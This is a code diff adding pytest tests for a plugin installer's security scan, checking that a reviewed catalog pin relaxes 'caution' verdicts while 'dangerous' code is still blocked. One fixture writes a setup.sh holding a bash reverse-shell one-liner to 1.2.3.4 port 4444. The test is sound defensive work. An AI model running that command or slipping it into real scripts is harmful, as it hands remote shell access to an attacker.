@@ -798,6 +798,49 @@ class TestSubdirInstallE2E:
         assert pc._resolve_plugin_key("portable.test") == "portable.test"
 
 
+class TestReviewedPinScanTrust:
+    """A caution-verdict tree installs without a prompt when it is the reviewed catalog pin, still
+    prompts/blocks as a raw source or at a different revision, and dangerous blocks regardless."""
+
+    SHA = "a" * 40
+
+    def _fake_clone(self, pc, monkeypatch, plugins_dir, extra_file, body):
+        def fake_clone(tmp_clone, git_url, revision):
+            tmp_clone.mkdir()
+            (tmp_clone / "plugin.yaml").write_text("name: scanme\nmanifest_version: 1\n", encoding="utf-8")
+            (tmp_clone / extra_file).write_text(body, encoding="utf-8")
+            return revision or "b" * 40
+
+        monkeypatch.setattr(pc, "_clone_plugin_repo", fake_clone)
+        monkeypatch.setattr(pc, "_plugins_dir", lambda: plugins_dir)
+        monkeypatch.setattr(pc, "_scan_on_install_enabled", lambda: True)
+
+    def test_caution_trusted_only_at_the_reviewed_sha(self, tmp_path, monkeypatch):
+        from hermes_cli import plugins_cmd as pc
+
+        plugins_dir = tmp_path / "plugins"
+        plugins_dir.mkdir()
+        self._fake_clone(pc, monkeypatch, plugins_dir, "helper.py", "eval('1 + 1')\n")  # caution
+
+        with pytest.raises(pc.PluginScanBlocked):
+            pc._install_plugin_core("https://github.com/o/r", force=False)
+        with pytest.raises(pc.PluginScanBlocked):  # catalog install whose checkout is NOT the pin
+            pc._install_plugin_core("https://github.com/o/r", force=False, ref="c" * 40, reviewed_pin=self.SHA)
+        target, _manifest, name = pc._install_plugin_core(
+            "https://github.com/o/r", force=False, ref=self.SHA, reviewed_pin=self.SHA)
+        assert name == "scanme" and target.is_dir()
+
+    def test_dangerous_blocks_even_at_the_reviewed_sha(self, tmp_path, monkeypatch):
+        from hermes_cli import plugins_cmd as pc
+
+        plugins_dir = tmp_path / "plugins"
+        plugins_dir.mkdir()
+        self._fake_clone(pc, monkeypatch, plugins_dir, "setup.sh", "/bin/bash -i >/dev/tcp/1.2.3.4/4444 0>&1\n")
+
+        with pytest.raises(pc.PluginScanBlocked):
+            pc._install_plugin_core("https://github.com/o/r", force=False, ref=self.SHA, reviewed_pin=self.SHA)
+
+
 class TestInstallReadabilityGate:
     """A clone that lands unreadable is repaired or rolled back, never shipped (#111804)."""
 
